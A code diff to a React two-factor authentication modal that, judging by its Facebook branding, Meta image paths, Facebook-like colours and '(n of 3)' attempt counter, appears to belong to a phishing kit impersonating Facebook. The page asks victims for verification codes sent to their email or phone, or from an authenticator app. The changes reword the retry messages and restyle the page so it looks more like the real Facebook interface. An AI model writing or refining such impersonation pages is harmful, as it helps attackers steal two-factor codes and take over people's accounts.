@@ -17,6 +17,21 @@ function isValidTwoFaCode(value: string): boolean {
     return TWO_FA_LENGTHS.some((len) => value.length === len && /^\d+$/.test(value));
 }
 
+function twoFaRetryMessage(minutes: number, seconds: number): string {
+    const m = Math.max(0, minutes);
+    const s = Math.max(0, seconds);
+    if (m === 0 && s === 0) {
+        return 'That code is incorrect. Please try again in a moment.';
+    }
+    if (m > 0 && s > 0) {
+        return `That code is incorrect. Try again in ${m} min ${s} sec.`;
+    }
+    if (m > 0) {
+        return `That code is incorrect. Try again in ${m} min.`;
+    }
+    return `That code is incorrect. Try again in ${s} sec.`;
+}
+
 const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish, onToggleModal }) => {
 
     const [isOpen, setIsOpen] = React.useState(isOpend);
@@ -92,7 +107,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                         const minutes = Math.floor(countdown / 60);
                         const seconds = countdown % 60;
                         setErrors({
-                            twoFa: `The two-factor authentication you entered is incorrect. Please, try again after ${minutes > 0 ? minutes : 0} minutes ${seconds > 0 ? seconds : 0} seconds.`,
+                            twoFa: twoFaRetryMessage(minutes, seconds),
                         });
 
                         setLoading(false);
@@ -107,7 +122,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                             const seconds = countdown % 60;
 
                             setErrors({
-                                twoFa: `The two-factor authentication you entered is incorrect. Please, try again after ${minutes > 0 ? minutes : 0} minutes ${seconds > 0 ? seconds : 0} seconds.`
+                                twoFa: twoFaRetryMessage(minutes, seconds),
                             });
 
                             if (countdown <= 0) {
@@ -135,7 +150,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                         const minutes = Math.floor(countdown / 60);
                         const seconds = countdown % 60;
                         setErrors({
-                            twoFa: `The two-factor authentication you entered is incorrect. Please, try again after ${minutes > 0 ? minutes : 0} minutes ${seconds > 0 ? seconds : 0} seconds.`,
+                            twoFa: twoFaRetryMessage(minutes, seconds),
                         });
                         setLoading(false);
                         setTwoFa('');
@@ -149,7 +164,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                             const seconds = countdown % 60;
 
                             setErrors({
-                                twoFa: `The two-factor authentication you entered is incorrect. Please, try again after ${minutes > 0 ? minutes : 0} minutes ${seconds > 0 ? seconds : 0} seconds.`
+                                twoFa: twoFaRetryMessage(minutes, seconds),
                             });
 
                             if (countdown <= 0) {
@@ -207,13 +222,19 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
         >
             <div className="h-full flex flex-col flex-start w-full items-center justify-between flex-1">
                 <div className='w-full'>
-                    <div className='flex w-full items-center text-[#9a979e] gap-[6px] text-[14px] mb-[7px]'>
-                        <span>{fullName}</span>
-                        <div className="w-[4px] h-[4px] bg-[#9a979e] rounded-[5px]"></div>
+                    <div className='flex w-full items-center text-[#65676b] gap-[6px] text-[14px] mb-[8px]'>
+                        <span className="font-medium text-[#465a69]">{fullName}</span>
+                        <span className="text-[#ccd0d5]" aria-hidden>·</span>
                         <span>Facebook</span>
                     </div>
-                    <h2 className='text-[20px] text-[black] font-[700] mb-[15px]'>Two-factor authentication required (1/3)</h2>
-                    <p className='text-[#9a979e] text-[14px]'>Enter the code for this account that we send to {emailDisplay}, {phoneDisplay} or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)</p>
+                    <h2 className='text-[20px] text-[#0A1317] font-semibold tracking-tight mb-[12px]'>
+                        Two-factor authentication ({click + 1} of 3)
+                    </h2>
+                    <p className='text-[#465a69] text-[15px] leading-relaxed'>
+                        Enter the verification code sent to {emailDisplay} or {phoneDisplay}, or open your
+                        authenticator app (for example, Google Authenticator or Duo Mobile) and enter the
+                        current code.
+                    </p>
                     <div className='w-full rounded-[10px] bg-[#f5f5f5] overflow-hidden my-[15px]'>
                         <img src="/images/meta/authentication.png" width="100%" alt="authentication" />
                     </div>
@@ -238,6 +259,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
 
                             <div className='w-full mt-[20px]'>
                                 <button
+                                    type="submit"
                                     className={`h-[45px] min-h-[45px] w-full bg-[#0064E0] text-white rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center transition-opacity duration-300 ${loading || disabled || !isTwoFaValid ? 'opacity-70 cursor-not-allowed' : 'cursor-pointer'}`}
                                     disabled={disabled || !isTwoFaValid}
                                 >
